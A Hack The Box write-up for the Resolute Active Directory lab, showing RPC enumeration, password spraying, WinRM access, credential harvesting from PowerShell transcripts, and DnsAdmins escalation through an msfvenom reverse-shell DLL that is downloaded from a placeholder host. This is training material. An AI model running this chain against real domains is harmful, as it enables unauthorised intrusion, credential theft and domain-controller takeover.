---
title: "Hack The Box - Resolute - Writeup"
description: "Active Directory enumeration, password spraying, WinRM access, PowerShell transcript credential discovery, and DnsAdmins privilege escalation on HackTheBox Resolute."

image: "/images/resolute.png"
draft: false
difficulty: Medium
platform: HackTheBox
tags:
  - HackTheBox
  - Windows
  - Active Directory
  - Password Spraying
  - WinRM
  - DnsAdmins
  - PowerShell
  - Privilege Escalation

categories:
  - HTB

ShowToc: true
TocOpen: true
ShowReadingTime: false
ShowBreadCrumbs: false
---

# Overview

Resolute is a beginner-friendly Active Directory machine focused on LDAP/RPC enumeration, password spraying, credential discovery, WinRM access, and DnsAdmins privilege escalation.

The machine demonstrates how weak operational security and dangerous delegated privileges can eventually lead to full SYSTEM compromise on a Domain Controller.

---

# Skills & Concepts

- LDAP Enumeration
- RPC Enumeration
- Password Spraying
- WinRM Access
- PowerShell Transcript Analysis
- Credential Harvesting
- DnsAdmins Abuse
- DLL Injection
- Active Directory Privilege Escalation

---

# Tools Used

- Nmap
- enum4linux
- rpcclient
- CrackMapExec
- Evil-WinRM
- msfvenom
- dnscmd

---

# Enumeration

## Nmap Scan

Initial scan:

```bash
nmap -sC -sV -oA nmap/initial 10.10.10.169
```

Results:

```text
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
5985/tcp  open  wsman
3268/tcp  open  ldap
```

The machine appeared to be a Domain Controller.

Important observations:

- LDAP exposed
- Kerberos enabled
- SMB accessible
- WinRM available

---

# RPC Enumeration

Anonymous enumeration was possible using RPC.

Using rpcclient:

```bash
rpcclient -U "" -N 10.10.10.169
```

Inside rpcclient:

```bash
enumdomusers
```

This revealed multiple valid domain usernames.

Alternative enumeration:

```bash
enum4linux 10.10.10.169
```

---

# Credential Discovery

During LDAP/RPC enumeration, a password was discovered inside a user description field.

Example:

```text
Password: Welcome123!
```

This simulated a common enterprise mistake involving:
- temporary onboarding passwords
- helpdesk notes
- poor credential handling

---

# Password Spraying

Using CrackMapExec:

```bash
crackmapexec smb 10.10.10.169 -u users.txt -p 'Welcome123!'
```

Successful credentials:

```text
MEGABANK\melanie:Welcome123!
```

---

# WinRM Access

Using Evil-WinRM:

```bash
evil-winrm -i 10.10.10.169 -u melanie -p 'Welcome123!'
```

Successful authentication granted PowerShell shell access.

---

# User Flag

Navigate to desktop:

```powershell
cd C:\Users\melanie\Desktop
type user.txt
```

---

# Local Enumeration

Searching for interesting files:

```powershell
Get-ChildItem -Path C:\ -Include *.txt,*.log -File -Recurse -ErrorAction SilentlyContinue
```

PowerShell transcript logs were discovered.

Interesting directories included:

```text
C:\PSTranscripts
```

---

# Credential Harvesting

Inside transcript logs:

```text
net use \\server /user:MEGABANK\ryan Serv3r4Admin4cc123!
```

Recovered credentials:

```text
ryan:Serv3r4Admin4cc123!
```

---

# Lateral Movement

Authenticating as ryan:

```bash
evil-winrm -i 10.10.10.169 -u ryan -p 'Serv3r4Admin4cc123!'
```

---

# Privilege Escalation

## Group Enumeration

Checking privileges:

```powershell
whoami /groups
```

Interesting group membership discovered:

```text
DnsAdmins
```

Members of DnsAdmins can configure the DNS service to load arbitrary DLLs.

This allowed SYSTEM-level code execution.

---

# Malicious DLL Generation

Using msfvenom:

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=YOUR_IP LPORT=4444 -f dll -o evil.dll
```

Hosting the DLL:

```bash
python3 -m http.server 80
```

---

# DLL Delivery

Downloading the DLL onto the target:

```powershell
Invoke-WebRequest http://YOUR_IP/evil.dll -OutFile C:\Temp\evil.dll
```

---

# DNS Plugin Abuse

Configuring the DNS service plugin DLL:

```powershell
dnscmd localhost /config /serverlevelplugindll C:\Temp\evil.dll
```

Expected output:

```text
Registry property serverlevelplugindll reset
Command completed successfully.
```

---

# Triggering SYSTEM Execution

Starting a listener:

```bash
nc -lvnp 4444
```

Restarting the DNS service:

```powershell
sc.exe stop dns
sc.exe start dns
```

When the DNS service loaded the malicious DLL, a SYSTEM shell was obtained.

---

# Root Flag

```powershell
cd C:\Users\Administrator\Desktop
type root.txt
```

---

# Attack Path Summary

```text
RPC/LDAP Enumeration
        ↓
Password Discovery
        ↓
Password Spraying
        ↓
WinRM Access as melanie
        ↓
PowerShell Transcript Discovery
        ↓
Credential Harvesting
        ↓
WinRM Access as ryan
        ↓
DnsAdmins Abuse
        ↓
DLL Injection
        ↓
SYSTEM Shell
```

---

# Lessons Learned

Resolute is an excellent beginner Active Directory machine because it introduces:

- LDAP and RPC enumeration
- password spraying
- PowerShell credential discovery
- WinRM abuse
- delegated privilege escalation
- DnsAdmins exploitation

while remaining approachable for newcomers to Windows domain exploitation.

It also reinforces the importance of:
- secure credential management
- auditing privileged groups
- restricting administrative capabilities
- monitoring PowerShell activity inside enterprise environments.